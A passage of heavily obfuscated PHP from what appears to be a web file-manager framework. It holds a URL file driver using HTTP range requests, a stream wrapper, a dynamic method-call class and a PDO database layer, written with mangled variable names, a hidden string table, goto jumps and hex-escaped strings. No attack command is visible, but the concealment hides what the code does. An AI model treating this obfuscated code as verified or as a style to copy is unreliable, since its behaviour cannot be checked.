$É­²Àş[$ğ›İ™ûâ[1589]] = isset($ĞÙ¹¶¤[$ğ›İ™ûâ[1623]]) ? strtotime($ĞÙ¹¶¤[$ğ›İ™ûâ[1623]]) : $É­²Àş[$ğ›İ™ûâ[1588]]; return $É­²Àş; } protected function _isFolder($›¾¨‘Şê) { $áğ…æ¾Â =& $_SERVER[®»±”ó²]; if ($›¾¨‘Şê == $áğ…æ¾Â[12] || $›¾¨‘Şê == $áğ…æ¾Â[8]) { return !0; } $ıÖÅÛ‹Ì = $this->_objectMeta($›¾¨‘Şê); return isset($ıÖÅÛ‹Ì[$áğ…æ¾Â[33]]) && $ıÖÅÛ‹Ì[$áğ…æ¾Â[33]] == $áğ…æ¾Â[78] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($¸É¿°ì  = false) { } public function exist($¶µ’›Ş…) { $ˆÀÂ¬Œ² = $this->info($¶µ’›Ş…); return $ˆÀÂ¬Œ²[$_SERVER[®»±”ó²][235]]; } public function isFile($Ïì»˜—º) { $ÆšÈ‡úå = $this->info($Ïì»˜—º); return $ÆšÈ‡úå[$_SERVER[®»±”ó²][235]]; } public function isFolder($ïâÍ¿§Æ) { return !1; } public function size($Ö£Ú¬·¹) { $ÜßŸØïç = $this->info($Ö£Ú¬·¹); return $ÜßŸØïç[$_SERVER[®»±”ó²][79]]; } public function info($ûÌ´üŸŞ) { return $this->infoParse($ûÌ´üŸŞ); } public function infoAuth($¨•È) { return $this->infoParse($¨•È); } public function infoWithChildren($ÉÑü¦®¾) { return $this->infoParse($ÉÑü¦®¾); } public function infoFull($í”æÅğÓ) { return $this->infoParse($í”æÅğÓ); } private function infoParse($úù¾±¦í) { $œÈõËÆÆ =& $_SERVER[®»±”ó²]; $ŒšñÈè‡ = $this->header($úù¾±¦í); if (!$ŒšñÈè‡ || !$ŒšñÈè‡[$œÈõËÆÆ[830]]) { return !1; } $›ôÛ£ø¹ = _get($ŒšñÈè‡, $œÈõËÆÆ[414], 0); $‡§™¢üØ = array($œÈõËÆÆ[32] => $ŒšñÈè‡[$œÈõËÆÆ[32]], $œÈõËÆÆ[87] => $úù¾±¦í, $œÈõËÆÆ[33] => $œÈõËÆÆ[233], $œÈõËÆÆ[79] => intval($›ôÛ£ø¹), $œÈõËÆÆ[169] => get_path_ext($ŒšñÈè‡[$œÈõËÆÆ[32]]), $œÈõËÆÆ[1475] => $›ôÛ£ø¹ > 0 && $ŒšñÈè‡[$œÈõËÆÆ[1624]], $œÈõËÆÆ[1476] => !1); return $‡§™¢üØ; } private function header($ÖàÍ¯) { $Òüá¡ı° =& $_SERVER[®»±”ó²]; if (isset(self::$_cacheHeader[$ÖàÍ¯])) { return self::$_cacheHeader[$ÖàÍ¯]; } $„êªàÖ• = isset($GLOBALS[$Òüá¡ı°[1625]]) ? $GLOBALS[$Òüá¡ı°[1625]] : !1; $GLOBALS[$Òüá¡ı°[1625]] = !0; self::$_cacheHeader[$ÖàÍ¯] = url_header($ÖàÍ¯); $GLOBALS[$Òüá¡ı°[1625]] = $„êªàÖ•; return self::$_cacheHeader[$ÖàÍ¯]; } public function hashSimple($ååãÀÅ, $ûÀ®¿´İ = false) { $áğáñ¬Ã =& $_SERVER[®»±”ó²]; $ØÈ†× = $this->info($ååãÀÅ); if (!$ØÈ†× || !$ØÈ†×[$áğáñ¬Ã[235]]) { return !1; } $âòÂ°Û– = $ØÈ†×[$áğáñ¬Ã[79]]; $¯Ùğ ˆü = 200; $íŠÓŠå° = 50; if ($âòÂ°Û– <= $¯Ùğ ˆü * $íŠÓŠå°) { return md5($this->fileSubstr($ååãÀÅ, 0, $âòÂ°Û–)) . $âòÂ°Û–; } $Ş×ûüÜ = intval($âòÂ°Û– / $íŠÓŠå°); $ŞàçÆÃ³ = $áğáñ¬Ã[12]; $‘‰‘ÕŒ“ = timeFloat(); $”îó¶Û¦ = 15; for ($¯³‹ËË£ = 0; $¯³‹ËË£ < $íŠÓŠå°; $¯³‹ËË£++) { if (timeFloat() - $‘‰‘ÕŒ“ > $”îó¶Û¦) { return !1; } $ã»£Õíš = $this->fileSubstr($ååãÀÅ, $Ş×ûüÜ * $¯³‹ËË£, $¯Ùğ ˆü); if (!$ã»£Õíš) { return !1; } $ŞàçÆÃ³ .= $ã»£Õíš; } $ŞàçÆÃ³ .= $this->fileSubstr($ååãÀÅ, $âòÂ°Û– - $¯Ùğ ˆü, $¯Ùğ ˆü); return md5($ŞàçÆÃ³) . $âòÂ°Û–; } public function getContent($úê–àÊÂ) { return $this->fileSubstr($úê–àÊÂ); } public function fileSubstr($Ë¡®¢˜î, $ë‚¥•šÄ = 0, $æºÙÑ¼¬ = -1) { $ê‘·È÷× =& $_SERVER[®»±”ó²]; $ş™ŸŒ‹Ÿ = $this->info($Ë¡®¢˜î); if (!$ş™ŸŒ‹Ÿ || !$ş™ŸŒ‹Ÿ[$ê‘·È÷×[235]] && $ş™ŸŒ‹Ÿ[$ê‘·È÷×[79]] > 1024 * 1024 * 10) { return !1; } if ($æºÙÑ¼¬ === -1) { $æºÙÑ¼¬ = $ş™ŸŒ‹Ÿ[$ê‘·È÷×[79]]; } if ($æºÙÑ¼¬ == 0) { return $ê‘·È÷×[12]; } $œ³×÷ìÄ = array($ê‘·È÷×[1626] . $ë‚¥•šÄ . $ê‘·È÷×[868] . ($ë‚¥•šÄ + $æºÙÑ¼¬ - 1)); $ÖÅƒ‚– = url_request($Ë¡®¢˜î, $ê‘·È÷×[1515], !1, $œ³×÷ìÄ, !1, !1, 30); return $ÖÅƒ‚–[$ê‘·È÷×[1299]] ? $ÖÅƒ‚–[$ê‘·È÷×[1299]] : $ê‘·È÷×[12]; } public function download($ÚˆÓ îí, $§åç£¨Ì) { Downloader::start($ÚˆÓ îí, $§åç£¨Ì); return $§åç£¨Ì; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($¬§²òÙ, $ÈßÂ·ù° = '') { $this->info = $this->info($¬§²òÙ); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[®»±”ó²][87]]; $this->pathOpen = $¬§²òÙ; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$¬§²òÙ])) { self::$_chunkBuffer[$¬§²òÙ] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($È™£¥ô) { $å«µÓó‰ = $this->fileSubstr($this->pose, $È™£¥ô); $this->pose += strlen($å«µÓó‰); return $å«µÓó‰; } public function stream_tell() { return $this->pose; } public function stream_seek($§£„ä“, $İ”ó¨¾) { $’î¡«•× =& $_SERVER[®»±”ó²]; if ($İ”ó¨¾ == SEEK_SET) { $this->pose = $§£„ä“; } else { if ($İ”ó¨¾ == SEEK_CUR) { $this->pose += $§£„ä“; } else { if ($İ”ó¨¾ == SEEK_END) { $this->pose = $this->info[$’î¡«•×[79]] + intval($§£„ä“); } } } if ($§£„ä“ < 0) { $this->pose = $this->info[$’î¡«•×[79]] + $§£„ä“; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[®»±”ó²][79]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($Ê˜Û€Äé, $úÎ»ğ Ğ) { $×Ä–ªúå =& $_SERVER[®»±”ó²]; $ûÌá’æÈ = $this->info($Ê˜Û€Äé); return array($×Ä–ªúå[1419] => 0, $×Ä–ªúå[1627] => 0, $×Ä–ªúå[16] => 32768 + 511, $×Ä–ªúå[1628] => 0, $×Ä–ªúå[1629] => 0, $×Ä–ªúå[1630] => 0, $×Ä–ªúå[1631] => 0, $×Ä–ªúå[79] => $ûÌá’æÈ[$×Ä–ªúå[79]], $×Ä–ªúå[1632] => $ûÌá’æÈ[$×Ä–ªúå[1474]], $×Ä–ªúå[1589] => $ûÌá’æÈ[$×Ä–ªúå[88]], $×Ä–ªúå[1588] => $ûÌá’æÈ[$×Ä–ªúå[234]], $×Ä–ªúå[1633] => 0, $×Ä–ªúå[1634] => 0); } static $fileInfo = array(); public function info($ƒÒğÇ“Ó) { $¹¸çšüè = $_SERVER[®»±”ó²][1635]; if (isset(self::$fileInfo[$ƒÒğÇ“Ó])) { return self::$fileInfo[$ƒÒğÇ“Ó]; } if (substr($ƒÒğÇ“Ó, 0, strlen($¹¸çšüè)) != $¹¸çšüè) { return !1; } self::$fileInfo[$ƒÒğÇ“Ó] = IO::info(substr($ƒÒğÇ“Ó, strlen($¹¸çšüè))); return self::$fileInfo[$ƒÒğÇ“Ó]; } public static function read($æ¨µÆµ, $ê™¢ŞÆš, $à–ÂŒ™İ) { if (!isset(self::$_fopenCache[$æ¨µÆµ])) { $§©ÓåŞí = new StreamWrapperIO(); $§©ÓåŞí->stream_open($æ¨µÆµ); self::$_fopenCache[$æ¨µÆµ] = $§©ÓåŞí; } $§©ÓåŞí = self::$_fopenCache[$æ¨µÆµ]; return $§©ÓåŞí->fileSubstr($ê™¢ŞÆš, $à–ÂŒ™İ); } public static function _read($ì°‡º¬‚, $Öç¢îÊš, $æŞŠ©èô) { $µ°»æßü =& $_SERVER[®»±”ó²]; $êñâÔÃ = fopen($ì°‡º¬‚, $µ°»æßü[1478]); if (!$êñâÔÃ) { return $µ°»æßü[12]; } $°–éõ£ğ = 8192; fseek($êñâÔÃ, $Öç¢îÊš, SEEK_SET); $ğÆÉ¶öö = $µ°»æßü[12]; $…“û§º× = 0; while ($…“û§º× < $æŞŠ©èô) { $üØÇÈÃ” = min($°–éõ£ğ, $æŞŠ©èô - $…“û§º×); $ğÆÉ¶öö .= fread($êñâÔÃ, $üØÇÈÃ”); $…“û§º× += $üØÇÈÃ”; } fclose($êñâÔÃ); return $ğÆÉ¶öö; } public function fileSubstr($óĞÇ„‡¶, $§¬±şË) { $‹êãé§ =& $_SERVER[®»±”ó²]; $·Ïİ¯ = $this->info[$‹êãé§[79]]; $„ ¨æì = $óĞÇ„‡¶; $¨İŸ–¹ï = $§¬±şË; if ($óĞÇ„‡¶ < 0) { $óĞÇ„‡¶ = $·Ïİ¯ + $óĞÇ„‡¶; } if ($§¬±şË === !1) { $§¬±şË = $·Ïİ¯ - $óĞÇ„‡¶; } if ($óĞÇ„‡¶ + $§¬±şË > $·Ïİ¯) { $§¬±şË = $·Ïİ¯ - $óĞÇ„‡¶; } if ($§¬±şË <= 0) { return $‹êãé§[12]; } if ($óĞÇ„‡¶ < 0 || $óĞÇ„‡¶ >= $·Ïİ¯ || $§¬±şË <= 0 || $§¬±şË > 1024 * 1024 * 10) { throw new Exception("\x69\x6f\106\x69\154\x65\122\145\x61\x64\x20\145\162\x72\x6f\x72\x21\x20\x73\x74\x61\x72\164\75{$óĞÇ„‡¶}\x3b\154\145\x6e\x67\164\x68\x3d{$§¬±şË}\73\x20\x73\151\x7a\145\75{$·Ïİ¯}\x3b"); } $Ïˆ„¶ø = 64 * 1024; $ÈæÏ¦†¬ =& self::$_chunkBuffer[$this->path]; if (!$ÈæÏ¦†¬) { $ÈæÏ¦†¬ = array(); } $Ö»š‘ØĞ = 0; $ø ë±›› = 0; $äÁ¢‹øÌ = $‹êãé§[12]; foreach ($ÈæÏ¦†¬ as $Ö»š‘ØĞ => $äÁ¢‹øÌ) { $Ö»š‘ØĞ = intval($Ö»š‘ØĞ); $ø ë±›› = $Ö»š‘ØĞ + strlen($äÁ¢‹øÌ); if ($óĞÇ„‡¶ >= $ø ë±››) { continue; } if ($óĞÇ„‡¶ >= $Ö»š‘ØĞ && $óĞÇ„‡¶ + $§¬±şË <= $ø ë±››) { return substr($äÁ¢‹øÌ, $óĞÇ„‡¶ - $Ö»š‘ØĞ, $§¬±şË); } break; } if (count($ÈæÏ¦†¬) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($‹êãé§[1636], $‹êãé§[1637] . count($ÈæÏ¦†¬) . "\x3b\163\164\x61\x72\x74\75{$óĞÇ„‡¶}\x2c\x6c\145\156\147\x74\150\75{$§¬±şË}\x3b\x70\x6f\163\x65\x3a{$Ö»š‘ØĞ}\x7e{$ø ë±››}"); throw new Exception($‹êãé§[1638]); } $±ÇÆá”ü = intval($óĞÇ„‡¶ / $Ïˆ„¶ø) * $Ïˆ„¶ø; $ÈÏß½Äª = ceil(($óĞÇ„‡¶ + $§¬±şË) / $Ïˆ„¶ø) * $Ïˆ„¶ø - $±ÇÆá”ü; $×ï«´ÛØ = IO::fileSubstr($this->path, $±ÇÆá”ü, $ÈÏß½Äª); $ÈæÏ¦†¬[$±ÇÆá”ü . $‹êãé§[12]] = $×ï«´ÛØ; ksort($ÈæÏ¦†¬); $ğıèÜîÌ = substr($×ï«´ÛØ, $óĞÇ„‡¶ - $±ÇÆá”ü, $§¬±şË); return $ğıèÜîÌ; } private function log($ª—€š‚Œ, $ç‹Ä€éà) { $¥´Èƒé =& $_SERVER[®»±”ó²]; $Ş¡êîøÏ = timeFloat() - $this->timeStart; write_log(sprintf($¥´Èƒé[1639], $ª—€š‚Œ, $this->info[$¥´Èƒé[32]], $Ş¡êîøÏ, $ç‹Ä€éà), $¥´Èƒé[1276]); } } goto Aºƒ »éç; A«ù«äº: function binCheckBigger($§ã«àâº, $½¤ÌüÖŞ) { return $§ã«àâº > $½¤ÌüÖŞ; } $_SERVER[$_SERVER[İÌ¯²„´][3]] = ("\70\66\70\60"."\70\66")+0;$_qns9="i6va7mqzgsr4unw5cyj2obh1d9xe08kl3fptfr9pe42wdlc1z6anmiv30jkogx5y7hq8ubstpjv5ona7tf";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($œ•‡ÈÔ, $Ó¹öï«) { $¡½›•àø =& $_SERVER[®»±”ó²]; if (isset(self::$_methodList[$œ•‡ÈÔ])) { return @call_user_func_array(self::$_methodList[$œ•‡ÈÔ], $Ó¹öï«); } else { if (method_exists($this, $œ•‡ÈÔ)) { return call_user_func_array(array($this, $œ•‡ÈÔ), $Ó¹öï«); } else { think_exception(__CLASS__ . $¡½›•àø[4] . $œ•‡ÈÔ . $¡½›•àø[5]); } } } public static function __callStatic($ˆêÈ Îõ, $È„›—Ü) { if (isset(self::$_methodListStatic[$ˆêÈ Îõ])) { return call_user_func_array(self::$_methodListStatic[$ˆêÈ Îõ], $È„›—Ü); } else { if (method_exists(self, $ˆêÈ Îõ)) { return call_user_func_array(array(self, $ˆêÈ Îõ), $È„›—Ü); } else { show_json("{$ˆêÈ Îõ}\x28\51\40\x6e\x6f\x74\x20\145\170\151\x73\164\73", !1); } } } public static function addMethod($±Ò›Ş±Ü, $ô·Ú¬íƒ) { self::$_methodList[$±Ò›Ş±Ü] = $ô·Ú¬íƒ; } public static function addMethodStatic($Â´úº¡Ï, $á½š„İ€) { self::$_methodListStatic[$Â´úº¡Ï] = $á½š„İ€; } } goto F†õëÊêŞ; CÛÒ†Á¼Ä¯: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($¾¿³¿°Ø = '') { $ı€Ÿóáì =& $_SERVER[®»±”ó²]; if (!class_exists($ı€Ÿóáì[1001])) { think_exception(think_lang($ı€Ÿóáì[14]) . $ı€Ÿóáì[1002]); } if (!empty($¾¿³¿°Ø)) { $this->config = $¾¿³¿°Ø; if (empty($this->config[$ı€Ÿóáì[17]])) { $this->config[$ı€Ÿóáì[17]] = array(); } } } public function connect($äŒ†ıëª = '', $œ¤¡Û = 0) { $Æ›ÃÒÑ =& $_SERVER[®»±”ó²]; if (!isset($this->linkID[$œ¤¡Û])) { if (empty($äŒ†ıëª)) { $äŒ†ıëª = $this->config; } $’“ü‘æ€ = !empty($äŒ†ıëª[$Æ›ÃÒÑ[17]][$Æ›ÃÒÑ[18]]) ? $äŒ†ıëª[$Æ›ÃÒÑ[17]][$Æ›ÃÒÑ[18]] : $this->pconnect; if ($’“ü‘æ€) { $äŒ†ıëª[$Æ›ÃÒÑ[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$œ¤¡Û] = new PDO($äŒ†ıëª[$Æ›ÃÒÑ[1003]], $äŒ†ıëª[$Æ›ÃÒÑ[975]], $äŒ†ıëª[$Æ›ÃÒÑ[976]], $äŒ†ıëª[$Æ›ÃÒÑ[17]]); } catch (PDOException $Ã˜ùÊÙı) { think_exception($Ã˜ùÊÙı->getMessage()); } $this->dbType = $this->_getDsnType($äŒ†ıëª[$Æ›ÃÒÑ[1003]]); if (in_array($this->dbType, array($Æ›ÃÒÑ[1004], $Æ›ÃÒÑ[1005], $Æ›ÃÒÑ[1006], $Æ›ÃÒÑ[1007]))) { think_exception($Æ›ÃÒÑ[1008] . $this->dbType . $Æ›ÃÒÑ[1009] . $this->dbType . $Æ›ÃÒÑ[1010]); } if (!$this->linkID[$œ¤¡Û]) { think_exception($Æ›ÃÒÑ[1011]); } try { $this->linkID[$œ¤¡Û]->exec($Æ›ÃÒÑ[1012] . think_config($Æ›ÃÒÑ[978])); } catch (Exception $Ã˜ùÊÙı) { } $this->connected = !0; if (1 != think_config($Æ›ÃÒÑ[22])) { unset($this->config); } } return $this->linkID[$œ¤¡Û]; } public function free() { $this->PDOStatement = null; } public function query($òßı´ÜÌ, $ìÍÊÌ­¹ = array()) { $¸Ÿ¨î¸ =& $_SERVER[®»±”ó²]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $òßı´ÜÌ; if (!empty($ìÍÊÌ­¹)) { $this->queryStr .= $¸Ÿ¨î¸[1013] . print_r($ìÍÊÌ­¹, !0) . $¸Ÿ¨î¸[1014]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($¸Ÿ¨î¸[23], 1); think_status($¸Ÿ¨î¸[24]); $this->PDOStatement = $this->_linkID->prepare($òßı´ÜÌ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $Í„®»­· = $this->PDOStatement->execute($ìÍÊÌ­¹); $this->debug(); if (!1 === $Í„®»­·) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($ÅôÑ¯®ä, $ªÇ…±Û© = array()) { $®ô†à‡ =& $_SERVER[®»±”ó²]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ÅôÑ¯®ä; if (!empty($ªÇ…±Û©)) { $this->queryStr .= $®ô†à‡[1013] . print_r($ªÇ…±Û©, !0) . $®ô†à‡[1014]; } $ÅÂŞ§¾¦ = !1; if ($this->dbType == $®ô†à‡[1007]) { if (preg_match($®ô†à‡[1015], $this->queryStr, $ù¯¥ÜË)) { $this->table = think_config($®ô†à‡[1016]) . str_ireplace(think_config($®ô†à‡[1017]), $®ô†à‡[456], $ù¯¥ÜË[2]); $ÅÂŞ§¾¦ = (bool) $this->query($®ô†à‡[1018] . strtoupper($this->table) . $®ô†à‡[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($®ô†à‡[25], 1); think_status($®ô†à‡[24]); $this->PDOStatement = $this->_linkID->prepare($ÅôÑ¯®ä); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $œ¥›®á” = $this->PDOStatement->execute($ªÇ…±Û©); $this->debug(); if (!1 === $œ¥›®á”) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($ÅÂŞ§¾¦ || preg_match($®ô†à‡[1019], $ÅôÑ¯®ä)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $µ¤ı€ıå = $this->_linkID->commit(); $this->transTimes = 0; if (!$µ¤ı€ıå) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Ù™¸ÓÔŸ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$Ù™¸ÓÔŸ) { $this->error(); return !1; } } return !0; } private function getAll() { $şÖîÍ™† = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($şÖîÍ™†); return $şÖîÍ™†; } public function getFields($µÅİ‡“°) { $¿€‰ÆæÉ =& $_SERVER[®»±”ó²]; $this->initConnect(!0); if (think_config($¿€‰ÆæÉ[1020])) { $ÆêıŸş = str_replace($¿€‰ÆæÉ[1021], $µÅİ‡“°, think_config($¿€‰ÆæÉ[1020])); } else { switch ($this->dbType) { case $¿€‰ÆæÉ[1004]: case $¿€‰ÆæÉ[1022]: $ÆêıŸş = "\x53\x45\x4c\x45\103\124\x20\40\x20\x63\157\x6c\x75\x6d\156\x5f\156\x61\155\x65\x20\141\x73\40\47\116\x61\x6d\x65\47\x2c\x20\x20\40\x64\141\x74\141\x5f\x74\171\160\x65\40\x61\x73\x20\x27\124\x79\160\x65\47\54\40\40\x20\x63\157\x6c\165\155\156\x5f\x64\x65\x66\141\165\x6c\x74\40\x61\x73\x20\47\104\145\x66\x61\165\x6c\x74\47\54\x20\x20\40\151\x73\x5f\x6e\165\x6c\154\x61\x62\x6c\x65\x20\141\x73\x20\47\x4e\x75\154\154\47\12\11\11\x46\122\117\115\11\151\156\146\157\162\x6d\141\x74\151\157\x6e\137\x73\x63\x68\145\x6d\x61\56\x74\x61\142\x6c\145\x73\40\x41\x53\x20\x74\xa\x9\x9\x4a\x4f\111\116\x9\151\x6e\x66\157\162\x6d\141\x74\151\157\156\x5f\x73\143\150\145\x6d\141\x2e\x63\x6f\154\x75\155\x6e\163\40\x41\x53\x20\x63\xa\11\x9\x4f\116\x20\x20\164\x2e\x74\x61\x62\154\145\137\143\141\x74\141\154\x6f\x67\x20\75\x20\x63\56\x74\141\142\154\145\x5f\143\141\x74\141\x6c\157\x67\xa\11\x9\101\x4e\104\x20\164\x2e\164\141\x62\154\145\x5f\163\x63\150\145\155\141\x20\x3d\40\143\x2e\164\141\142\154\x65\137\163\143\x68\x65\x6d\141\12\11\11\x41\x4e\x44\40\x74\56\164\141\142\x6c\x65\x5f\156\141\x6d\145\x20\x3d\40\143\x2e\x74\x61\142\x6c\145\x5f\x6e\x61\155\145\12\x9\11\127\110\x45\x52\105\40\x20\x20\x74\56\164\x61\x62\x6c\x65\x5f\156\141\x6d\x65\40\x3d\40\47{$µÅİ‡“°}\x27"; break; case $¿€‰ÆæÉ[1023]: $ÆêıŸş = $¿€‰ÆæÉ[1024] . $µÅİ‡“° . $¿€‰ÆæÉ[1025]; break; case $¿€‰ÆæÉ[1005]: case $¿€‰ÆæÉ[1007]: $ÆêıŸş = $¿€‰ÆæÉ[1026] . $¿€‰ÆæÉ[1027] . $¿€‰ÆæÉ[1028] . strtoupper($µÅİ‡“°) . $¿€‰ÆæÉ[1029] . strtoupper($µÅİ‡“°) . $¿€‰ÆæÉ[1030]; break; case $¿€‰ÆæÉ[1031]: $ÆêıŸş = $¿€‰ÆæÉ[1032] . $µÅİ‡“° . $¿€‰ÆæÉ[1033]; break; case $¿€‰ÆæÉ[1006]: break; case $¿€‰ÆæÉ[1034]: default: $ÆêıŸş = $¿€‰ÆæÉ[1035] . ($this->dbType == $¿€‰ÆæÉ[1034] ? "\x60{$µÅİ‡“°}\140" : $µÅİ‡“°); } } $ú¦€‡û› = $this->query($ÆêıŸş); $è×¹—•È = array(); if ($ú¦€‡û›) { foreach ($ú¦€‡û› as $´ÔŞ¥Áı => $àÁ‰Êñ‡) { $àÁ‰Êñ‡ = array_change_key_case($àÁ‰Êñ‡); $àÁ‰Êñ‡[$¿€‰ÆæÉ[32]] = isset($àÁ‰Êñ‡[$¿€‰ÆæÉ[32]]) ? $àÁ‰Êñ‡[$¿€‰ÆæÉ[32]] : $¿€‰ÆæÉ[456]; $àÁ‰Êñ‡[$¿€‰ÆæÉ[33]] = isset($àÁ‰Êñ‡[$¿€‰ÆæÉ[33]]) ? $àÁ‰Êñ‡[$¿€‰ÆæÉ[33]] : $¿€‰ÆæÉ[456]; $ì’Œ˜Ü½ = isset($àÁ‰Êñ‡[$¿€‰ÆæÉ[353]]) ? $àÁ‰Êñ‡[$¿€‰ÆæÉ[353]] : $àÁ‰Êñ‡[$¿€‰ÆæÉ[32]]; $è×¹—•È[$ì’Œ˜Ü½] = array($¿€‰ÆæÉ[32] => $ì’Œ˜Ü½, $¿€‰ÆæÉ[33] => $àÁ‰Êñ‡[$¿€‰ÆæÉ[33]], $¿€‰ÆæÉ[35] => (bool) (isset($àÁ‰Êñ‡[$¿€‰ÆæÉ[106]]) && $àÁ‰Êñ‡[$¿€‰ÆæÉ[106]] === $¿€‰ÆæÉ[12] || isset($àÁ‰Êñ‡[$¿€‰ÆæÉ[35]]) && $àÁ‰Êñ‡[$¿€‰ÆæÉ[35]] === $¿€‰ÆæÉ[12]), $¿€‰ÆæÉ[37] => isset($àÁ‰Êñ‡[$¿€‰ÆæÉ[37]]) ? $àÁ‰Êñ‡[$¿€‰ÆæÉ[37]] : (isset($àÁ‰Êñ‡[$¿€‰ÆæÉ[56]]) ? $àÁ‰Êñ‡[$¿€‰ÆæÉ[56]] : $¿€‰ÆæÉ[456]), $¿€‰ÆæÉ[39] => isset($àÁ‰Êñ‡[$¿€‰ÆæÉ[97]]) ? strtolower($àÁ‰Êñ‡[$¿€‰ÆæÉ[97]]) == $¿€‰ÆæÉ[41] : (isset($àÁ‰Êñ‡[$¿€‰ÆæÉ[57]]) ? $àÁ‰Êñ‡[$¿€‰ÆæÉ[57]] : !1), $¿€‰ÆæÉ[42] => isset($àÁ‰Êñ‡[$¿€‰ÆæÉ[1036]]) ? strtolower($àÁ‰Êñ‡[$¿€‰ÆæÉ[1036]]) == $¿€‰ÆæÉ[44] : (isset($àÁ‰Êñ‡[$¿€‰ÆæÉ[97]]) ? $àÁ‰Êñ‡[$¿€‰ÆæÉ[97]] : !1)); } } return $è×¹—•È; } public function getTables($¡‰»ÖÜÈ = '') { $í™ˆ£– =& $_SERVER[®»±”ó²]; if (think_config($í™ˆ£–[1037])) { $Î¸Š…º… = str_replace($í™ˆ£–[1038], $¡‰»ÖÜÈ, think_config($í™ˆ£–[1037])); } else { switch ($this->dbType) { case $í™ˆ£–[1005]: case $í™ˆ£–[1007]: $Î¸Š…º… = $í™ˆ£–[1039]; break; case $í™ˆ£–[1004]: case $í™ˆ£–[1022]: $Î¸Š…º… = $í™ˆ£–[1040]; break; case $í™ˆ£–[1031]: $Î¸Š…º… = $í™ˆ£–[1041]; break; case $í™ˆ£–[1006]: think_exception(think_lang($í™ˆ£–[1042]) . $í™ˆ£–[1043]); break; case $í™ˆ£–[1023]: $Î¸Š…º… = $í™ˆ£–[45] . $í™ˆ£–[46] . $í™ˆ£–[47]; break; case $í™ˆ£–[1034]: default: if (!empty($¡‰»ÖÜÈ)) { $Î¸Š…º… = $í™ˆ£–[986] . $¡‰»ÖÜÈ . $í™ˆ£–[987]; } else { $Î¸Š…º… = $í™ˆ£–[988]; } } } $å—–ó»‘ = $this->query($Î¸Š…º…); $ãÅ™£š” = array(); foreach ($å—–ó»‘ as $²®±¬å¬ => $ÊÃ£ÂáÛ) { $ãÅ™£š”[$²®±¬å¬] = current($ÊÃ£ÂáÛ); } return $ãÅ™£š”; } protected function parseLimit($ïØª£‰Œ) { $å‚Ù³• =& $_SERVER[®»±”ó²]; $íıÀç‚ = $å‚Ù³•[12]; if (!empty($ïØª£‰Œ)) { switch ($this->dbType) { case $å‚Ù³•[1031]: case $å‚Ù³•[1023]: $ïØª£‰Œ = explode($å‚Ù³•[50], $ïØª£‰Œ); if (count($ïØª£‰Œ) > 1) { $íıÀç‚ .= $å‚Ù³•[51] . $ïØª£‰Œ[1] . $å‚Ù³•[52] . $ïØª£‰Œ[0] . $å‚Ù³•[53]; } else { $íıÀç‚ .= $å‚Ù³•[51] . $ïØª£‰Œ[0] . $å‚Ù³•[53]; } break; case $å‚Ù³•[1004]: case $å‚Ù³•[1022]: break; case $å‚Ù³•[1006]: break; case $å‚Ù³•[1005]: case $å‚Ù³•[1007]: break; case $å‚Ù³•[1034]: default: $íıÀç‚ .= $å‚Ù³•[51] . $ïØª£‰Œ . $å‚Ù³•[53]; } } return $íıÀç‚; } public function parseKey(&$¶Úä©Ï‚, $™·û’ÆŠ = true) { $ÏçÒ›¯ =& $_SERVER[®»±”ó²]; if ($™·û’ÆŠ) { $¶Úä©Ï‚ = $this->parseKeyCheck($¶Úä©Ï‚); } if ($this->dbType == $ÏçÒ›¯[1034]) { if ($¶Úä©Ï‚ != $ÏçÒ›¯[223] && !preg_match($ÏçÒ›¯[998], $¶Úä©Ï‚)) { $¶Úä©Ï‚ = $ÏçÒ›¯[463] . trim($¶Úä©Ï‚, $ÏçÒ›¯[463]) . $ÏçÒ›¯[463]; } return $¶Úä©Ï‚; } else { return parent::parseKey($¶Úä©Ï‚, $™·û’ÆŠ); } } public function close() { $this->_linkID = null; } public function error() { $€Åúİ«‹ =& $_SERVER[®»±”ó²]; if ($this->PDOStatement) { $û‚¼£–µ = $this->PDOStatement->errorInfo(); $this->error = $û‚¼£–µ[1] . $€Åúİ«‹[4] . $û‚¼£–µ[2]; } else { $this->error = $€Åúİ«‹[12]; } if ($€Åúİ«‹[12] != $this->queryStr) { $this->error .= LNG($€Åúİ«‹[48]) . $this->queryStr; } think_trace($this->error, $€Åúİ«‹[12], $€Åúİ«‹[49]); return $this->error; } public function escapeString($Ü˜Ñöµƒ) { $Š»±‘ =& $_SERVER[®»±”ó²]; switch ($this->dbType) { case $Š»±‘[1031]: case $Š»±‘[1004]: case $Š»±‘[1022]: case $Š»±‘[1034]: return addslashes($Ü˜Ñöµƒ); case $Š»±‘[1006]: case $Š»±‘[1023]: case $Š»±‘[1005]: case $Š»±‘[1007]: return 